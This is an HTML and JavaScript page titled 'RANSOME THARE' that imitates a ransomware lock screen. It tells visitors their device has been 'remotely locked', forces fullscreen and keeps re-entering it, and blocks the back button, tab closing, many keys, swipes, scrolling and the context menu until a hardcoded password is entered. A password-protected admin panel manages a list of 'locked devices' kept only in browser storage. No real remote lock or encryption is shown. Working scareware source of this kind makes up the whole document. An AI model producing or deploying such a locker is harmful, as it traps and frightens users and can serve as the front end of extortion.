<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>RANSOME THARE</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            font-family: 'Courier New', monospace;
            background: #4a2c0a;
            min-height: 100vh;
            color: #d4a373;
            overflow: hidden;
            position: fixed;
            width: 100%;
            height: 100%;
            touch-action: none;
        }

        /* LOCK SCREEN - FULL BROWN */
        .lock-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #4a2c0a;
            z-index: 99999;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            padding: 25px;
            touch-action: none;
        }

        .skull {
            font-size: 100px;
            margin-bottom: 20px;
            filter: drop-shadow(0 0 15px #ff6600);
            animation: shake 0.5s infinite;
        }

        @keyframes shake {
            0%,100% { transform: translateX(0); }
            25% { transform: translateX(-3px); }
            75% { transform: translateX(3px); }
        }

        h1 {
            font-size: 28px;
            margin-bottom: 8px;
            color: #ff6600;
            letter-spacing: 2px;
        }

        .sub {
            opacity: 0.7;
            margin-bottom: 30px;
            font-size: 12px;
        }

        .message-box {
            background: rgba(0,0,0,0.3);
            padding: 20px;
            border-radius: 15px;
            width: 85%;
            border: 1px solid #ff6600;
        }

        .label {
            font-size: 11px;
            letter-spacing: 2px;
            margin-bottom: 10px;
            color: #ffaa66;
        }

        .device-id {
            font-size: 18px;
            font-weight: bold;
            font-family: monospace;
            background: rgba(0,0,0,0.5);
            padding: 10px;
            border-radius: 10px;
            letter-spacing: 1px;
        }

        /* SETTINGS BUTTON - GREEN */
        .settings-btn {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            background: #2e7d32;
            color: white;
            border: none;
            border-radius: 50px;
            padding: 14px 30px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            z-index: 100000;
            box-shadow: 0 0 15px #4caf50;
            transition: 0.2s;
            letter-spacing: 2px;
        }

        .settings-btn:active {
            transform: translateX(-50%) scale(0.95);
        }

        /* ADMIN PANEL */
        .admin-panel {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #1a1a2e;
            z-index: 200000;
            padding: 20px;
            overflow-y: auto;
            flex-direction: column;
        }

        .admin-header {
            background: #2a2a3e;
            padding: 15px;
            border-radius: 15px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .admin-header h2 {
            color: #ff9800;
            font-size: 18px;
        }

        .close-admin {
            background: #f44336;
            border: none;
            padding: 8px 15px;
            border-radius: 10px;
            color: white;
            cursor: pointer;
        }

        .device-list {
            background: #2a2a3e;
            border-radius: 15px;
            padding: 15px;
            max-height: 400px;
            overflow-y: auto;
        }

        .device-item {
            background: #3a3a4e;
            padding: 12px;
            margin: 8px 0;
            border-radius: 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .device-item button {
            background: #ff9800;
            border: none;
            padding: 8px 15px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
        }

        .add-device {
            margin-top: 15px;
            display: flex;
            gap: 10px;
        }

        .add-device input {
            flex: 1;
            padding: 12px;
            border: none;
            border-radius: 10px;
            background: #3a3a4e;
            color: white;
        }

        .add-device button {
            padding: 12px 20px;
            background: #4caf50;
            border: none;
            border-radius: 10px;
            color: white;
            cursor: pointer;
        }

        /* PASSWORD MODAL */
        .password-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.98);
            z-index: 300000;
            justify-content: center;
            align-items: center;
        }

        .password-box {
            background: #2a2a2a;
            border-radius: 20px;
            padding: 30px;
            width: 90%;
            max-width: 320px;
            text-align: center;
            border: 2px solid #ff9800;
        }

        .password-box h3 {
            color: #ff9800;
            margin-bottom: 20px;
        }

        .password-box input {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            text-align: center;
            background: white;
        }

        .password-box button {
            width: 100%;
            padding: 12px;
            margin-top: 15px;
            background: #4caf50;
            color: white;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            font-weight: bold;
        }

        .pass-error {
            color: #ff5555;
            margin-top: 10px;
            display: none;
        }

        /* SUCCESS TOAST */
        .success-toast {
            position: fixed;
            bottom: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #4caf50;
            color: white;
            padding: 12px 25px;
            border-radius: 30px;
            font-size: 16px;
            z-index: 400000;
            display: none;
            white-space: nowrap;
        }
    </style>
</head>
<body>

    <!-- LOCK SCREEN -->
    <div id="lockScreen" class="lock-screen">
        <div class="skull">💀</div>
        <h1>🔒 DEVICE LOCKED</h1>
        <div class="sub">Your device has been remotely locked</div>
        <div class="message-box">
            <div class="label">🔐 DEVICE ID</div>
            <div class="device-id" id="deviceIdDisplay">----</div>
        </div>
        <div class="sub" style="margin-top: 20px;">⚠️ Contact administrator</div>
    </div>

    <!-- SETTINGS BUTTON - GREEN (Bottom Center) -->
    <button class="settings-btn" id="settingsBtn">⚙️ SETTINGS</button>

    <!-- ADMIN PANEL -->
    <div id="adminPanel" class="admin-panel">
        <div class="admin-header">
            <h2>👑 ADMIN PANEL - RANSOME THARE</h2>
            <button class="close-admin" onclick="closeAdminPanel()">✖ CLOSE</button>
        </div>
        <div class="device-list">
            <h3 style="margin-bottom: 10px; color:#ff9800;">📱 LOCKED DEVICES</h3>
            <div id="deviceListContainer">
                <p style="text-align:center;opacity:0.7;">Loading...</p>
            </div>
            <div class="add-device">
                <input type="text" id="newDeviceId" placeholder="New Device ID (or auto)">
                <button onclick="addNewDevice()">➕ ADD</button>
            </div>
        </div>
    </div>

    <!-- SETTINGS PASSWORD MODAL -->
    <div id="settingsPasswordModal" class="password-modal">
        <div class="password-box">
            <h3>🔐 ADMIN PASSWORD</h3>
            <input type="password" id="settingsPass" placeholder="Enter password" autocomplete="off">
            <button onclick="verifySettingsPassword()">LOGIN</button>
            <div id="settingsPassError" class="pass-error">❌ Wrong password!</div>
        </div>
    </div>

    <!-- EXIT PASSWORD MODAL -->
    <div id="exitPasswordModal" class="password-modal">
        <div class="password-box">
            <h3>🔐 ENTER PASSWORD TO EXIT</h3>
            <input type="password" id="exitPass" placeholder="Enter password" autocomplete="off">
            <button onclick="verifyExitPassword()">UNLOCK & EXIT</button>
            <div id="exitPassError" class="pass-error">❌ Wrong password!</div>
        </div>
    </div>

    <!-- SUCCESS TOAST -->
    <div id="successToast" class="success-toast">✅ UNLOCKED! Exiting...</div>

    <script>
        // ========== PASSWORDS ==========
        const ADMIN_SETTINGS_PASSWORD = "satvir0001";
        const EXIT_PASSWORD = "809080";
        
        // ========== DATA ==========
        let lockedDevices = JSON.parse(localStorage.getItem('ransome_locked_devices') || '[]');
        let currentDeviceId = localStorage.getItem('ransome_current_device') || null;

        // ========== GENERATE DEVICE ID ==========
        function generateDeviceId() {
            return 'DEV-' + Math.floor(10000 + Math.random() * 90000).toString();
        }

        // ========== SAVE & UPDATE ==========
        function saveDevices() {
            localStorage.setItem('ransome_locked_devices', JSON.stringify(lockedDevices));
            updateDeviceList();
        }

        function updateDeviceList() {
            const container = document.getElementById('deviceListContainer');
            if (!container) return;
            
            if (lockedDevices.length === 0) {
                container.innerHTML = '<p style="text-align:center;opacity:0.7;">No locked devices</p>';
            } else {
                container.innerHTML = '';
                lockedDevices.forEach(device => {
                    const div = document.createElement('div');
                    div.className = 'device-item';
                    div.innerHTML = `
                        <span>🔒 ${device.id}</span>
                        <button onclick="forceUnlock('${device.id}')">🔓 FORCE UNLOCK</button>
                    `;
                    container.appendChild(div);
                });
            }
        }

        function addNewDevice() {
            let id = document.getElementById('newDeviceId').value.trim();
            if (!id) {
                id = generateDeviceId();
            }
            if (id.length < 4) {
                alert('ID too short!');
                return;
            }
            if (lockedDevices.find(d => d.id === id)) {
                alert('Device already exists!');
                return;
            }
            lockedDevices.push({ id: id, lockedAt: new Date().toISOString() });
            saveDevices();
            alert(`✅ Device ${id} added!`);
            document.getElementById('newDeviceId').value = '';
        }

        function forceUnlock(deviceId) {
            if (confirm(`Force unlock ${deviceId}?`)) {
                lockedDevices = lockedDevices.filter(d => d.id !== deviceId);
                saveDevices();
                alert(`✅ Device ${deviceId} unlocked!`);
                if (currentDeviceId === deviceId) {
                    exitBrowser();
                }
            }
        }

        // ========== FULLSCREEN MODE ==========
        function enterFullscreen() {
            const elem = document.documentElement;
            if (elem.requestFullscreen) {
                elem.requestFullscreen();
            } else if (elem.webkitRequestFullscreen) {
                elem.webkitRequestFullscreen();
            } else if (elem.msRequestFullscreen) {
                elem.msRequestFullscreen();
            }
        }

        // Re-enter fullscreen if exited
        document.addEventListener('fullscreenchange', function() {
            if (currentDeviceId && !document.fullscreenElement && !document.webkitFullscreenElement) {
                setTimeout(() => enterFullscreen(), 100);
            }
        });
        document.addEventListener('webkitfullscreenchange', function() {
            if (currentDeviceId && !document.fullscreenElement && !document.webkitFullscreenElement) {
                setTimeout(() => enterFullscreen(), 100);
            }
        });

        // ========== BLOCK ALL EXITS (SLIDES, SWIPES, KEYS) ==========
        function blockAllExits() {
            // Block back button
            window.history.pushState(null, '', window.location.href);
            window.addEventListener('popstate', function(e) {
                if (currentDeviceId) {
                    window.history.pushState(null, '', window.location.href);
                    showExitPasswordPrompt();
                }
            });

            // Block tab close
            window.addEventListener('beforeunload', function(e) {
                if (currentDeviceId) {
                    e.preventDefault();
                    e.returnValue = 'Device locked! Enter password to exit.';
                    return 'Device locked! Enter password to exit.';
                }
            });

            // Block keyboard
            document.addEventListener('keydown', function(e) {
                if (currentDeviceId) {
                    const blocked = ['F5', 'F12', 'Escape', 'Home', 'Backspace', 'ArrowLeft', 'ArrowRight', 'ArrowUp', 'ArrowDown', 'Meta', 'Alt', 'Tab'];
                    if (blocked.includes(e.key) || (e.ctrlKey && (e.key === 'r' || e.key === 'w' || e.key === 'q'))) {
                        e.preventDefault();
                        showExitPasswordPrompt();
                        return false;
                    }
                }
            });

            // Block ALL touch swipes (left, right, up, down)
            let touchStartX = 0, touchStartY = 0;
            document.addEventListener('touchstart', function(e) {
                if (currentDeviceId) {
                    touchStartX = e.touches[0].clientX;
                    touchStartY = e.touches[0].clientY;
                    e.preventDefault();
                }
            });
            document.addEventListener('touchmove', function(e) {
                if (currentDeviceId) {
                    e.preventDefault();
                }
            });
            document.addEventListener('touchend', function(e) {
                if (currentDeviceId) {
                    let touchEndX = e.changedTouches[0].clientX;
                    let touchEndY = e.changedTouches[0].clientY;
                    let diffX = Math.abs(touchEndX - touchStartX);
                    let diffY = Math.abs(touchEndY - touchStartY);
                    if (diffX > 30 || diffY > 30) {
                        e.preventDefault();
                        showExitPasswordPrompt();
                    }
                }
            });

            // Block context menu (long press)
            document.addEventListener('contextmenu', function(e) {
                if (currentDeviceId) {
                    e.preventDefault();
                    return false;
                }
            });

            // Block wheel/scroll
            document.addEventListener('wheel', function(e) {
                if (currentDeviceId) {
                    e.preventDefault();
                }
            }, { passive: false });
        }

        // ========== EXIT PASSWORD ==========
        function showExitPasswordPrompt() {
            if (currentDeviceId) {
                document.getElementById('exitPasswordModal').style.display = 'flex';
                document.getElementById('exitPass').value = '';
                document.getElementById('exitPassError').style.display = 'none';
            }
        }

        function verifyExitPassword() {
            const pass = document.getElementById('exitPass').value;
            if (pass === EXIT_PASSWORD) {
                document.getElementById('exitPasswordModal').style.display = 'none';
                const toast = document.getElementById('successToast');
                toast.style.display = 'block';
                setTimeout(() => {
                    toast.style.display = 'none';
                    exitBrowser();
                }, 1000);
            } else {
                document.getElementById('exitPassError').style.display = 'block';
            }
        }

        function exitBrowser() {
            setTimeout(() => {
                window.close();
                window.location.href = 'about:blank';
            }, 500);
        }

        // ========== SETTINGS (ADMIN) ==========
        function showSettingsPassword() {
            document.getElementById('settingsPasswordModal').style.display = 'flex';
            document.getElementById('settingsPass').value = '';
            document.getElementById('settingsPassError').style.display = 'none';
        }

        function verifySettingsPassword() {
            const pass = document.getElementById('settingsPass').value;
            if (pass === ADMIN_SETTINGS_PASSWORD) {
                document.getElementById('settingsPasswordModal').style.display = 'none';
                showAdminPanel();
            } else {
                document.getElementById('settingsPassError').style.display = 'block';
            }
        }

        function showAdminPanel() {
            document.getElementById('adminPanel').style.display = 'flex';
            updateDeviceList();
        }

        function closeAdminPanel() {
            document.getElementById('adminPanel').style.display = 'none';
        }

        // ========== INIT ==========
        function init() {
            const urlParams = new URLSearchParams(window.location.search);
            let deviceId = urlParams.get('id');
            
            if (!deviceId) {
                deviceId = generateDeviceId();
                if (!lockedDevices.find(d => d.id === deviceId)) {
                    lockedDevices.push({ id: deviceId, lockedAt: new Date().toISOString() });
                    saveDevices();
                }
                window.location.href = `?id=${encodeURIComponent(deviceId)}`;
                return;
            }
            
            const isLocked = lockedDevices.find(d => d.id === deviceId);
            if (isLocked) {
                currentDeviceId = deviceId;
                localStorage.setItem('ransome_current_device', deviceId);
                document.getElementById('deviceIdDisplay').innerText = deviceId;
                document.getElementById('lockScreen').style.display = 'flex';
                
                setTimeout(() => enterFullscreen(), 500);
                blockAllExits();
                
                setInterval(() => {
                    if (currentDeviceId) {
                        window.history.pushState(null, '', window.location.href);
                    }
                }, 300);
            } else {
                showAdminPanel();
            }
        }

        // Attach events
        document.getElementById('settingsBtn').addEventListener('click', showSettingsPassword);

        init();
    </script>
</body>
</html>
